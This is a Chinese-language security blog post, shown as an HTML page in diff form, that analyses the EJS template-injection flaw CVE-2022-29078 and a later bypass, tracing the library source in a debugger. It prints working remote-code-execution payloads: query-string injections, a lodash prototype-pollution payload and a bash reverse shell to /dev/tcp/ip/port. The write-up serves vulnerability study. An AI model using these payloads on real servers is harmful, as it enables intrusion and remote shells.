@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/gkjzjh146.github.io\/",
+  "author": {
+    "@type": "Person",
+    "name": "gkjzjh146",
+    
+    "image": "https://gkjzjh146.github.io/images/1.jpg"
+    
+  },
+  "name":"gkjzjh146",
+  "description":"",
+  "url":"https:\/\/gkjzjh146.github.io\/post\/ejs%E5%A4%A7%E6%9D%82%E7%83%A9\/",
+  "keywords":"[ejs, cve]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.115.4 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="gkjzjh146">
+<meta name="keywords" content="ejs, cve">
+<meta name="description" content="">
+
+
+<meta property="og:description" content="">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2022-29078">
+<meta name="twitter:title" content="CVE-2022-29078">
+<meta property="og:url" content="https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/">
+<meta property="twitter:url" content="https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/">
+<meta property="og:site_name" content="gkjzjh146">
+<meta property="og:description" content="">
+<meta name="twitter:description" content="">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2023-08-21T16:43:21">
+  
+  
+    <meta property="article:modified_time" content="2023-08-21T16:43:21">
+  
+  
+  
+    
+      <meta property="article:section" content="代码审计">
+    
+  
+  
+    
+      <meta property="article:tag" content="ejs">
+    
+      <meta property="article:tag" content="代码审计">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/images/1.jpg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/images/1.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/8.png">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/8.png">
+
+
+  <meta property="og:image" content="https://gkjzjh146.github.io/6.jpeg">
+  <meta property="twitter:image" content="https://gkjzjh146.github.io/6.jpeg">
+
+
+    <title>CVE-2022-29078</title>
+
+    <link rel="icon" href="https://gkjzjh146.github.io/images/1.jpg">
+    
+
+    
+
+    <link rel="canonical" href="https://gkjzjh146.github.io/post/ejs%E5%A4%A7%E6%9D%82%E7%83%A9/">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://gkjzjh146.github.io/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://gkjzjh146.github.io/" aria-label="去首页">gkjzjh146</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://gkjzjh146.github.io/#about" aria-label="打开链接: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://gkjzjh146.github.io/#about" aria-label="阅读有关作者的更多信息">
+          <img class="sidebar-profile-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">gkjzjh146</h4>
+        
+          <h5 class="sidebar-profile-bio">会点web，会点misc</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">分类</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://gkjzjh146.github.io/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              "
+       style="background-image:url('/8.png')"
+       data-behavior="4">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title">
+      CVE-2022-29078
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2023-08-21T16:43:21&#43;08:00">
+        
+  八月 21, 2023
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://gkjzjh146.github.io/categories/%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1">代码审计</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="4"
+        class="hasCover
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <h1 id="table-of-contents">目录</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cve-2022-29078">CVE-2022-29078</a>
+      <ul>
+        <li><a href="#环境搭建">环境搭建</a></li>
+        <li><a href="#漏洞分析">漏洞分析</a>
+          <ul>
+            <li><a href="#模板注入分析">模板注入分析</a></li>
+            <li><a href="#原型链污染">原型链污染</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#cve-2022-29078-bypass">CVE-2022-29078 bypass</a>
+      <ul>
+        <li><a href="#环境搭建-1">环境搭建</a></li>
+        <li><a href="#漏洞分析-1">漏洞分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#总结">总结</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+
+<p>学习并记录一下</p>
+<h1 id="cve-2022-29078">CVE-2022-29078</h1>
+<p><strong>ejs&lt;=3.16</strong></p>
+<p>NodeJS 的 EJS（嵌入式 JavaScript 模板）版本 3.1.6 或更早版本中存在 SSTI（服务器端模板注入）漏洞。</p>
+<p>该漏洞<code>settings[view options][outputFunctionName]</code>在EJS渲染成HTML时，用浅拷贝覆盖值，最后插入OS Command导致RCE。</p>
+<h2 id="环境搭建">环境搭建</h2>
+<pre tabindex="0"><code>npm install ejs@3.1.6
+npm install express
+</code></pre><p>我是使用webstorm进行调试的，调试的话要稍微设置一下，不然跟进不了源码</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822111505137.png" alt="image-20230822111505137"></p>
+<p><strong>app.js</strong></p>
+<pre tabindex="0"><code>const express = require(&#39;express&#39;);
+const app = express();
+const path = require(&#39;path&#39;);
+
+app.set(&#39;view engine&#39;, &#39;ejs&#39;);
+app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;));
+
+app.get(&#39;/&#39;, (req, res) =&gt; {
+    // 渲染模板并传递数据
+    res.render(&#39;index&#39;, req.query );
+});
+
+app.listen(3000, () =&gt; {
+    console.log(&#39;Server is running on port 3000&#39;);
+});
+</code></pre><p><strong>index.ejs</strong></p>
+<pre tabindex="0"><code>&lt;html&gt;
+    &lt;head&gt;
+        &lt;title&gt;Lab CVE-2022-29078&lt;/title&gt;
+    &lt;/head&gt;
+
+    &lt;body&gt;
+        &lt;h2&gt;CVE-2022-29078&lt;/h2&gt;
+        &lt;%= test %&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h2 id="漏洞分析">漏洞分析</h2>
+<h3 id="模板注入分析">模板注入分析</h3>
+<p>漏洞是有ejs造成的，所以我们直接锁定ejs的源码</p>
+<p>我们查看<code>Node_Modules</code> 的 <code>ejs/lib/ejs.js</code> 文件，取看看<code>req.query</code>是怎么进行传递的，主要看的是<code>renderFile</code>，因为它的作用是解析文件生成<code>HTML</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">renderFile</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">args</span> <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">slice</span>.<span style="color:#a6e22e">call</span>(<span style="color:#a6e22e">arguments</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">shift</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cb</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">opts</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">filename</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">filename</span>};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">data</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">viewOpts</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Do we have a callback?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">arguments</span>[<span style="color:#a6e22e">arguments</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cb</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">pop</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Do we have data/opts?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">length</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Should always have data obj
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">shift</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Normal passed opts (data obj + opts obj)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">length</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Use shallowCopy so we don&#39;t pollute passed in opts obj with new vals
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">shallowCopy</span>(<span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">args</span>.<span style="color:#a6e22e">pop</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Special casing for Express (settings + opts-in-data)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Express 3 and 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">settings</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Pull a few things from known locations
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">settings</span>.<span style="color:#a6e22e">views</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">views</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">settings</span>.<span style="color:#a6e22e">views</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">settings</span>[<span style="color:#e6db74">&#39;view cache&#39;</span>]) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">cache</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Undocumented after Express 2, but still usable, esp. for
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// items that are unsafe to be passed along with data, like `root`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">viewOpts</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">settings</span>[<span style="color:#e6db74">&#39;view options&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">viewOpts</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">shallowCopy</span>(<span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">viewOpts</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Express 2 and lower, values set in app.locals, or people who just
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// want to pass options in their data. NOTE: These values will override
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// anything previously set in settings  or settings[&#39;view options&#39;]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">shallowCopyFromList</span>(<span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">_OPTS_PASSABLE_WITH_DATA_EXPRESS</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">filename</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> {};
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">tryHandleCache</span>(<span style="color:#a6e22e">opts</span>, <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">cb</span>);
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>看到这里</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230821221227347.png" alt="image-20230821221227347"></p>
+<p>先判断长度是否存在进入第一个<code>if</code>，然后拿掉数组第一个元素作为<code>data</code>，再判断长度，第二个<code>if</code>，<code>args.pop()</code> 获取数组中的最后一个元素， <code>utils.shallowCopy</code> 是将属性浅复制<code>opts</code> 对象中，我们不进入第二个<code>if</code>，而是要进入<code>else</code></p>
+<p>往下看</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822073436514.png" alt="image-20230822073436514"></p>
+<p>这里<code>data</code>是我们传入的数据而来，可控，那么强行插入<code>setting['view options']</code>来设置，<code>payload</code>如下：</p>
+<pre tabindex="0"><code>http://127.0.0.1:3000?test=AAAA&amp;settings[view%20options][A]=BBBB
+</code></pre><p>然后进入</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822074208437.png" alt="image-20230822074208437"></p>
+<p>我们跟进<code>shallowCopy</code>函数里面看看</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822074252637.png" alt="image-20230822074252637"></p>
+<p>这里就有点像<code>merge</code>函数</p>
+<p>看到compile这里</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822081133806.png" alt="image-20230822081133806"></p>
+<p>从代码中可以看出，<code>opts</code>将<code>outputFunctionName</code>的元素值取出<code>prepended</code>并放入 中。</p>
+<p><code>opts</code>值可控，<code>outputFuntionName</code>也可控，那么可以构造payload</p>
+<pre tabindex="0"><code>127.0.0.1:3000?test=AAAA&amp;settings[view%20options][outputFunctionName]=x;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;);x
+</code></pre><p>那么<code>pretended</code>就为</p>
+<pre tabindex="0"><code>var x;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;);x = __append;
+</code></pre><p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822102613329.png" alt="image-20230822102613329"></p>
+<h3 id="原型链污染">原型链污染</h3>
+<pre tabindex="0"><code>npm install lodash@4.7.12
+</code></pre><p><strong>ejs</strong></p>
+<pre tabindex="0"><code>var express = require(&#39;express&#39;);
+var lodash = require(&#39;lodash&#39;);
+var ejs = require(&#39;ejs&#39;);
+
+var app = express();
+//设置模板的位置与种类
+app.set(&#39;views&#39;, __dirname);
+app.set(&#39;views engine&#39;,&#39;ejs&#39;);
+
+//对原型进行污染
+var malicious_payload = &#39;{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&#34;}}&#39;;
+lodash.merge({}, JSON.parse(malicious_payload));
+
+//进行渲染
+app.get(&#39;/&#39;, function (req, res) {
+    res.render (&#34;index.ejs&#34;,{
+        message: &#39;Ic4_F1ame&#39;
+    });
+});
+
+//设置http
+var server = app.listen(8000, function () {
+
+    var host = server.address().address
+    var port = server.address().port
+
+    console.log(&#34;应用实例，访问地址为 http://%s:%s&#34;, host, port)
+});
+</code></pre><p><strong>index.ejs</strong></p>
+<pre tabindex="0"><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;meta charset=&#34;utf-8&#34;&gt;
+    &lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822111813944.png" alt="image-20230822111813944"></p>
+<p>跟进，到<code>response.js</code>的<code>app.render</code>函数</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822111900755.png" alt="image-20230822111900755"></p>
+<p>继续跟进到<code>(view, renderOptions, done);</code></p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822112019179.png" alt="image-20230822112019179"></p>
+<p>看看<code>tryRender</code>函数的实现，是调用<code>view.render(options, callback);</code></p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822112112407.png" alt="image-20230822112112407"></p>
+<p>跟进<code>render</code>函数，这里调用<code>this.engine</code>函数</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822112349803.png" alt="image-20230822112349803"></p>
+<p>跟进<code>this.engine(this.path, options, callback);</code>这里我们就进入了上面分析的模板渲染引擎<code>ejs.js</code>里面</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822112702228.png" alt="image-20230822112702228"></p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822112710056.png" alt="image-20230822112710056"></p>
+<p>继续跟进<code>return tryHandleCache(opt,data,cb);</code></p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822112839733.png" alt="image-20230822112839733"></p>
+<p>跟进<code>tryHandleCache</code>，调用<code>handleCache</code>方法，传data参数</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822113052035.png" alt="image-20230822113052035"></p>
+<p>跟进<code>handleCache</code>，调用渲染模板的<code>compile</code>方法</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822113349668.png" alt="image-20230822113349668"></p>
+<p>这里调用了<code>templ.compile()</code>方法，继续往下跟</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822113506988.png" alt="image-20230822113506988"></p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822121443679.png" alt="image-20230822121443679"></p>
+<p><strong>payload合集</strong></p>
+<pre tabindex="0"><code>{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).execSync(&#39;calc&#39;);var __tmp2&#34;}}
+
+{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(&#39;calc&#39;);var __tmp2&#34;}}
+
+{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&#34;&#39;);var __tmp2&#34;}}
+</code></pre><h1 id="cve-2022-29078-bypass">CVE-2022-29078 bypass</h1>
+<h2 id="环境搭建-1">环境搭建</h2>
+<p><strong>ejs &lt;= v3.1.9</strong></p>
+<pre tabindex="0"><code>const express = require(&#39;express&#39;);
+const app = express();
+const PORT = 3000;
+app.set(&#39;views&#39;, __dirname);
+app.set(&#39;view engine&#39;, &#39;ejs&#39;);
+app.get(&#39;/&#39;, (req, res) =&gt; {
+    res.render(&#39;index&#39;, req.query);
+});
+
+app.listen(PORT, ()=&gt; {
+    console.log(`Server is running on ${PORT}`);
+});
+</code></pre><h2 id="漏洞分析-1">漏洞分析</h2>
+<p><strong>payload</strong></p>
+<pre tabindex="0"><code>?settings[view%20options][escapeFunction]=console.log;this.global.process.mainModule.require(%27child_process%27).execSync(&#34;touch /tmp/3.txt&#34;);&amp;settings[view%20options][client]=true
+</code></pre><p>前面的链子基本相同，不同的是最后的拼接</p>
+<p><img src="https://gkjzjh146.github.io/ejs%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230822125052376.png" alt="image-20230822125052376"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">source</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">generateSource</span>();
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+=</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;  var __output = &#34;&#34;;\n&#39;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }\n&#39;</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">outputFunctionName</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_JS_IDENTIFIER</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">outputFunctionName</span>)) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;outputFunctionName is not a valid JS identifier.&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">prepended</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;  var &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">outputFunctionName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; = __append;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">localsName</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">_JS_IDENTIFIER</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">localsName</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> Error(<span style="color:#e6db74">&#39;localsName is not a valid JS identifier.&#39;</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">destructuredLocals</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">destructuredLocals</span>.<span style="color:#a6e22e">length</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">destructuring</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;  var __locals = (&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">localsName</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; || {}),\n&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">destructuredLocals</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">destructuredLocals</span>[<span style="color:#a6e22e">i</span>];
